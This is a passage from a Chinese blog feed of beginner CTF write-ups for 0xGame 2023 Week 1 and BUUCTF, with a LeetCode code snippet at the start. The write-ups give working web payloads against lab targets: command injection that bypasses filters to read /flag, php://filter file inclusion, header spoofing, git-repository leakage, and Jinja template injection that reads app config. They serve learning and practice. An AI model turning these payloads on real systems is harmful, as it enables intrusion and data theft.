class_">StringBuilder</span>(numStr).reverse().toString();<br>        <span class="hljs-keyword">if</span> (numStr.equals(reverseNumStr)) &#123;<br>            System.out.println(num + <span class="hljs-string">&quot; 是一个回文数&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            System.out.println(num + <span class="hljs-string">&quot; 不是一个回文数&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Solution</span> <span class="hljs-variable">solution</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Solution</span>();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> <span class="hljs-number">12321</span>; <br>        solution.check_it(num);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup_2023_0xGame_Week1</title>
    <link href="/2023/09/18/ko1/"/>
    <url>/2023/09/18/ko1/</url>
    
    <content type="html"><![CDATA[<p>菜鸟的Write_up，只接触过web</p><span id="more"></span><h1 id="web部分"><a href="#web部分" class="headerlink" title="web部分"></a>web部分</h1><h3 id="Week-1-ping"><a href="#Week-1-ping" class="headerlink" title="[Week 1] ping"></a>[Week 1] ping</h3><p>根据题目想到可能是RCE：</p><p><img src="/img/ping1.png" alt="ping1"></p><p>看下源码发现提示：<code>&lt;!-- visit &#39;/api.php?source&#39; for hint --&gt;</code>,访问：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs PHP"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sanitize</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>); <span class="hljs-comment">//;过滤可以用其它分隔符绕过，比如&amp;&amp;啥的</span><br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>); <span class="hljs-comment">//空格过滤可以用$&#123;IFS&#125;啥的绕过</span><br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>); <span class="hljs-comment">// /过滤可以用反引号和printf配合绕过：`printf$&#123;IFS&#125;&quot;\57&quot;`</span><br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>); <span class="hljs-comment">//flag被过滤可以用通配符*绕过：fl*</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$s</span>;                      <br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>])) &#123;<span class="hljs-comment">//POST传IP</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No IP Address&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">sanitize</span>(<span class="hljs-variable">$ip</span>); <span class="hljs-comment">//对传过去的ip进行过滤</span><br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/((\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])\.)&#123;3&#125;(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])/&#x27;</span>, <span class="hljs-variable">$ip</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid IP Address&#x27;</span>);<br>&#125;<span class="hljs-comment">//正则匹配IPv4地址的格式，可以用换行符%0a绕过</span><br><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ping -c 4 &#x27;</span>.<span class="hljs-variable">$ip</span>. <span class="hljs-string">&#x27; 2&gt;&amp;1&#x27;</span>);  <span class="hljs-comment">//命令执行</span><br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>先利用ls看看当前目录下都有啥东西：</p><p><code>ip=127.0.0.1%0als</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">api<span class="hljs-selector-class">.php</span><br>index<span class="hljs-selector-class">.html</span><br>simple.css<br></code></pre></td></tr></table></figure><p>去根目录看看：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ip</span>=<span class="hljs-number">127.0.0.1</span>%<span class="hljs-number">0</span>als<span class="hljs-variable">$&#123;IFS&#125;</span>`printf<span class="hljs-variable">$&#123;IFS&#125;</span><span class="hljs-string">&quot;\57&quot;</span>`<br><span class="hljs-attribute">bin</span><br><span class="hljs-attribute">boot</span><br><span class="hljs-attribute">dev</span><br><span class="hljs-attribute">etc</span><br><span class="hljs-attribute">flag</span><br></code></pre></td></tr></table></figure><p>cat读&#x2F;flag的内容：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ip</span>=<span class="hljs-number">127.0.0.1</span>%<span class="hljs-number">0</span>acat<span class="hljs-variable">$&#123;IFS&#125;</span>`printf<span class="hljs-variable">$&#123;IFS&#125;</span><span class="hljs-string">&quot;\57&quot;</span>`fl*<br></code></pre></td></tr></table></figure><p>flag：0xGame{19c71976-d7d8-4ab8-9ea5-6ea3800f59f6}</p><h3 id="Week-1-baby-php"><a href="#Week-1-baby-php" class="headerlink" title="[Week 1] baby_php"></a>[Week 1] baby_php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// flag in flag.php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123; <br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<span class="hljs-comment">//GET传a和b,POST传c,COOKIE超全局变量中name对应$name</span><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)) &#123; <span class="hljs-comment">//md5加密数组会返回null，null==null成立</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$c</span>) &amp;&amp; <span class="hljs-variable">$c</span> != <span class="hljs-number">1024</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$c</span>) == <span class="hljs-number">1024</span>) &#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-variable">$name</span>.<span class="hljs-string">&#x27;.php&#x27;</span>); <span class="hljs-comment">//c不能是个数字，可以在任意数字后加个字母达到目的</span><br>        &#125;                          <span class="hljs-comment">//c不能等于1024，结合后面的intval函数想到利用小数绕过，intval一个小数并不会遵循四舍五入原则</span><br>    &#125;                              <span class="hljs-comment">//提示flag在flag.php中，文件包含漏洞。因为后面会加.php所以直接传flag看看情况</span><br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>综上：</p><p>GET<code>?a[]=1&amp;b[]=2</code>POST<code>c=1024.9a</code>并且<code>Cookie: name=flag</code></p><p>没反应，试了试目录穿越也没结果。想到用伪协议读flag.php：</p><p><code>Cookie: name=php://filter/convert.base64-encode/resource=flag</code></p><p>得到一串base64:</p><p><code>PD9waHAKCiRmbGFnID0gJzB4R2FtZXs0M2JiM2UyNC0wODI0LTQ4Y2ItOTVkMC1jNDcxNTQwYzA5NTN9JzsKCj8</code></p><p>解个码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;0xGame&#123;43bb3e24-0824-48cb-95d0-c471540c0953&#125;&#x27;</span>;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><code>flag = 0xGame&#123;43bb3e24-0824-48cb-95d0-c471540c0953&#125;</code></p><h3 id="Week-1-hello-http"><a href="#Week-1-hello-http" class="headerlink" title="[Week 1] hello_http"></a>[Week 1] hello_http</h3><p>第一关提示用<code>Get</code>方式传<code>query</code>，而且值必须是<code>ctf</code></p><p><code>?query=ctf</code></p><p>第二关提示用<code>POS</code>T传<code>action</code>,而且值必须是<code>getflag</code></p><p><code>action=getflag</code></p><p>第三关提示 <code>you are not admin</code>，想到这东西可能在cookie放着，burpsuite抓包：发现<code>Cookie: role=guest</code>，改成<code>Cookie: role=admin</code></p><p>第四关提示<code>Error: Only allow local IP</code>，还是抓包加个XFF头：</p><p><code>X-Forwarded-For:127.0.0.1</code></p><p>第五关提示<code>Error: You are not using HarmonyOS Browser 😡</code>，还是抓包改User-Agent：</p><p><code>User-Agent:HarmonyOS Browser</code></p><p>第六关提示必须来自<code>ys.mihoyo.com</code>，抓包改Referer：</p><p><code>Referer: ys.mihoyo.com</code></p><p>得到Flag:<code>0xGame&#123;2c1a10fb-921e-4250-820f-5ce36940b8b5&#125;</code></p><h3 id="Week-1-repo-leak"><a href="#Week-1-repo-leak" class="headerlink" title="[Week 1] repo_leak"></a>[Week 1] repo_leak</h3><p>进环境后发现是个博客主页，里面有个Notice博文写了这么个东西：</p><p><code>There is noting here. Using Git for version control</code></p><p>结合题目想到可能是敏感信息泄露，而且访问<code>/.git</code>并没有弹404</p><p>用dirsearch扫了一下，发现大量.git文件，猜测git泄露：</p><p><img src="/img/repo1.png" alt="repo1"></p><p>GitHack弄它：</p><p><code>python2 GitHack.py http://120.27.148.152:50013/.git</code></p><p><img src="/img/repo2.png" alt="repo2"></p><p>在存储扫描结果的文件夹利用<code>git log</code>查看每个commit都干了啥：</p><p><img src="/img/rerpo3.png" alt="rerpo3"></p><p>看到了三个版本，发现有个 <code>add post : flag</code></p><p>对比下版本拿flag:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git diff ea44cb8ff3c27bb1db6d3acc4c875144d295045d 8a5b670558921bd232d75b29542492f00698298b<br></code></pre></td></tr></table></figure><p><img src="/img/repo4.png" alt="repo4"></p><p><code>0xGame&#123;3fc49725-23b5-4f28-8c64-16a3459b67b7&#125;</code></p><h3 id="Week-1-signin"><a href="#Week-1-signin" class="headerlink" title="[Week 1] signin"></a>[Week 1] signin</h3><p>明明是签到却是最后一个解出来的:(运气好被我乱点点出来了</p><p><img src="/img/ok1.png" alt="ok1"></p><p><code>flag：0xGame&#123;c788fa80-2184-429f-b410-48cb8e2de0ff&#125;</code></p><h1 id="MISC部分"><a href="#MISC部分" class="headerlink" title="MISC部分"></a>MISC部分</h1><h3 id="Week-1-shark-shark"><a href="#Week-1-shark-shark" class="headerlink" title="[Week 1] shark shark"></a>[Week 1] shark shark</h3><p>第一次做杂项的题 :) 下载附件后用wireshark打开，发现好像是个登录过程？登录后执行了一些命令 ：</p><p><img src="/img/shark.png" alt="shark"></p><p>直接搜<code>0xGame</code>和<code>flag</code>都没结果。。但在返回包里有这么个东西？</p><p><img src="/img/shark2.png" alt="shark2"></p><p>把data拿出来拿去问了CHATGPT:)说这是一个ZIP文件的十六进制表示，要把它解码成二进制数据再解压。发现有个<code>flag.txt</code>文件，但需要密码：</p><p><img src="/img/shark3.png" alt="shark3"></p><p>想到刚才追踪流的时候有个very_safe_password，尝试了一下得到了flag：<code>0xGame&#123;7a504dab-ada6-4c41-adb3-0d1530098cd4&#125;</code></p><h3 id="Week-1-hide-and-seek"><a href="#Week-1-hide-and-seek" class="headerlink" title="[Week 1] hide and seek"></a>[Week 1] hide and seek</h3><p>根据题目提示和师傅在群里的提示，下载了<code>stegseek</code>这个工具，弄一下就得到flag了：</p><p><img src="/img/hiideandseek.png" alt="hiideandseek"></p><h3 id="Week-1-least-and-most"><a href="#Week-1-least-and-most" class="headerlink" title="[Week 1] least and most"></a>[Week 1] least and most</h3><p>题目提示是隐写，网上下了个叫<code>stegsolve</code>的工具，一通乱点得到了：</p><p><code>0xGame&#123;l sb_com</code>和<code>bined_wi th_msb&#125;</code>。</p><h3 id="Week-1-signin-1"><a href="#Week-1-signin-1" class="headerlink" title="[Week 1] signin"></a>[Week 1] signin</h3><p><code>R0I0RU9ZTE5NVjVWT1pMTU1NWUcyWks3S1JYVjZNRFlJNVFXMlpKU0dBWkRHSUpCUFU9PT09PT0=</code></p><p>看着像base64，先解码看看啥情况：</p><p><code>GB4EOYLNMV5VOZLMMMYG2ZK7KRXV6MDYI5QW2ZJSGAZDGIJBPU======</code></p><p>再用base32解一下：</p><p><code>0xGame&#123;Welc0me_To_0xGame2023!!&#125;</code></p><h3 id="Week-1-重生之我在教学楼打cs"><a href="#Week-1-重生之我在教学楼打cs" class="headerlink" title="[Week 1] 重生之我在教学楼打cs"></a>[Week 1] 重生之我在教学楼打cs</h3><p>下载发现是个bsp文件，根据师傅的提示发现这东西是个cs1.6的地图文件，重命名一下放到<code>cstrike</code>下的<code>maps</code>文件夹里，然后cs1.6直接进地图。在鼎右下角找到了一串小字：</p><p><code>0xGame&#123;CS_very_good&#125;</code></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h3 id="Week-1-找不到且不对劲的flag"><a href="#Week-1-找不到且不对劲的flag" class="headerlink" title="[Week 1] 找不到且不对劲的flag"></a>[Week 1] 找不到且不对劲的flag</h3><p><code> nc 8.130.35.16 51000</code>后<code>ls</code>,发现有个<code>flag</code>但<code>cat</code>读了发现是假的:</p><p><img src="/img/secret.png" alt="secret"></p><p><code>ls -al</code>发现有个<code>.secret</code>文件，<code>cat</code>读了下得到了<code>flag</code></p><p><img src="/img/pwn1.png" alt="pwn1"></p><h1 id="Crypto部分"><a href="#Crypto部分" class="headerlink" title="Crypto部分"></a>Crypto部分</h1><h3 id="Week-1-Vigenere"><a href="#Week-1-Vigenere" class="headerlink" title="[Week 1] Vigenere"></a>[Week 1] Vigenere</h3><p>题目描述：密文：0dGmqk{79ap4i0522g0a67m6i196he52357q60f} 古老而神秘的加密方式？</p><p><code>flag</code>格式<code>0xGame&#123;xxxx&#125;</code>，现在开头是<code>0dGmqk</code>，猜测密钥前四位是<code>game</code>?，先在线解密看下结果：</p><p><img src="/img/vig.png" alt="vig"></p><p>得到flag。</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF做题记录_1</title>
    <link href="/2023/09/17/helloworld/"/>
    <url>/2023/09/17/helloworld/</url>
    
    <content type="html"><![CDATA[<p>初学者的一些做题记录</p><span id="more"></span><hr><h2 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a><strong>shrine</strong></h2><p>进去直接给了一大坨代码，简单捋一下：<br><img src="/img/c1.png" alt="c1"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> flask <br><span class="hljs-keyword">import</span> os <br>app = flask.Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="hljs-string">&#x27;FLAG&#x27;</span>)<span class="hljs-comment">#将FLAG从环境变量中弹出去，弹出去的FLAG给了app.config字典中FLAG键对应的值，可以用config[&#x27;FLAG&#x27;]访问它，但后面会把config这东西当黑名单过滤掉。</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__).read()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/shrine/&#x27;</span></span>)</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">shrine</span>(<span class="hljs-params">shrine</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_jinja</span>(<span class="hljs-params">s</span>):<br>       s = s.replace(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-comment">#左括号替换为空，右括号替换为空</span><br>       blacklist = [<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>]<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> blacklist]) + s<span class="hljs-comment">#把黑名单里的字符全替换为空，两个%用来转义，否则&#123;&#125;就被当成占位符了。注意这个只替换双括号里的config和self，单个括号没啥影响。</span><br><br>  <span class="hljs-keyword">return</span> flask.render_template_string(safe_jinja(shrine))<br>  <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>  app.run(debug=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure><p>猜测SSTI模板注入，在&#x2F;shrine&#x2F;下尝试49:<br><img src="/img/c2.png" alt="c2"><br>七个七，而且代码里都提了Jinja。<br>对于输入首先过滤了()，然后过滤了config和self这两个关键字。<br>利用<code>/shrine/&#123;&#123;"".__class__.__base__.__base__&#125;&#125;</code>找到了它最大的爹<code>object</code>，再用subclasses找它下面的所有子类：<br><code>&#123;&#123;"".__class__.__base__.__base__.__subclasses__()&#125;&#125;</code><br><img src="/img/c3.png" alt="c3"><br>出了个这种东西就不会做了。感觉自己的知识还是太贫瘠了，一看到SSTI的题就想着判断类型然后找它的爹执行命令，都快成思维定式了。。。而且做题也不细心，既然它把config和self放到了黑名单里，那为什么偏偏放它俩呢？config可能是因为把FLAG直接弹给了它所以过滤，那self为什么过滤？希望以后在学习过程中能克服这些问题。<br>去网上找了下wp看看其它师傅是怎么解的，感谢这位师傅：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/Cl0ud/</span>p/<span class="hljs-number">12316287</span>.html<br>https:<span class="hljs-regexp">//</span>zhuanlan.zhihu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">93746437</span><br></code></pre></td></tr></table></figure><p>如果没有黑名单的化，直接即可访问环境变量中的FLAG，或者用self.<strong>dict</strong> 访问但config和self被黑名单过滤掉了。这时可以使用python内置函数：<code>url_for或者get_flashed_messages</code>读取全局变量<code>current_app</code>。再利用这个<code>current_app</code>访问config字典中FLAG键对应的值。</p><p>payload:<code>/shrine/&#123;&#123;url_for.__globals__['current_app'].config['FLAG']&#125;&#125;</code></p><h3 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a><strong>lottery</strong></h3><p>进环境发现是个类似猜骰子的东西：注册账号后去花钱猜数，猜对了给钱。当口袋饱饱之后可以买FLAG：</p><p><img src="/img/lo1.png" alt="lo1"></p><p>题目给了个附件，看看都有啥东西：</p><p><img src="/img/lo2.png" alt="lo2"></p><p>直接把所有代码都给了？和钱有关的代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-variable">$money</span> = <span class="hljs-string">&#x27;$&#x27;</span> . <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;money&#x27;</span>]; <span class="hljs-comment">//money在SESSION变量中？直接burpsuite抓包看看能不能改</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&lt;&lt;&lt;EOT</span><br><span class="hljs-string">&lt;li&gt;Username: <span class="hljs-subst">$name</span>&lt;/li&gt;</span><br><span class="hljs-string">&lt;li&gt;Money: <span class="hljs-subst">$money</span>&lt;/li&gt;</span><br><span class="hljs-string">EOT</span>;<br><br><span class="hljs-meta">?&gt;</span> <span class="hljs-comment">//acount.php</span><br></code></pre></td></tr></table></figure><p>直接去buy界面猜数抓包看看啥情况：</p><p><img src="/img/lo3.png" alt="lo3"></p><p>POST传了<code>&#123;&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:&quot;7777777&quot;&#125;</code>，<code>action:buy</code>，<code>numbers</code>后面是我们猜的数字，系统会把数字带进去和<code>&quot;win_numbers&quot;:&quot;8701664&quot;</code>比较，这个<code>win_numbers</code>和比较对错是怎么定义的？找找有没有相关的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buy</span>(<span class="hljs-params"><span class="hljs-variable">$req</span></span>)</span>&#123;<br><span class="hljs-title function_ invoke__">require_registered</span>();<br><span class="hljs-title function_ invoke__">require_min_money</span>(<span class="hljs-number">2</span>);<br><br><span class="hljs-variable">$money</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;money&#x27;</span>];<br><span class="hljs-variable">$numbers</span> = <span class="hljs-variable">$req</span>[<span class="hljs-string">&#x27;numbers&#x27;</span>];<br><span class="hljs-variable">$win_numbers</span> = <span class="hljs-title function_ invoke__">random_win_nums</span>(); <span class="hljs-comment">//后面那个是生成的七位随机数</span><br><span class="hljs-variable">$same_count</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>&lt;<span class="hljs-number">7</span>; <span class="hljs-variable">$i</span>++)&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$numbers</span>[<span class="hljs-variable">$i</span>] == <span class="hljs-variable">$win_numbers</span>[<span class="hljs-variable">$i</span>])&#123;  <span class="hljs-comment">//挺常见的弱相等，若对Numbers无过滤则直接输入布尔True让它和任何非零数字相等</span><br><span class="hljs-variable">$same_count</span>++;<br>&#125;<br>&#125;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$same_count</span>) &#123;   <span class="hljs-comment">//两个及以上相同才会给钱</span><br><span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">5</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">20</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">300</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">1800</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">200000</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">5000000</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-variable">$money</span> += <span class="hljs-variable">$prize</span> - <span class="hljs-number">2</span>;  <span class="hljs-comment">//每次尝试需要两块钱</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;money&#x27;</span>] = <span class="hljs-variable">$money</span>;<br><span class="hljs-title function_ invoke__">response</span>([<span class="hljs-string">&#x27;status&#x27;</span>=&gt;<span class="hljs-string">&#x27;ok&#x27;</span>,<span class="hljs-string">&#x27;numbers&#x27;</span>=&gt;<span class="hljs-variable">$numbers</span>, <span class="hljs-string">&#x27;win_numbers&#x27;</span>=&gt;<span class="hljs-variable">$win_numbers</span>, <span 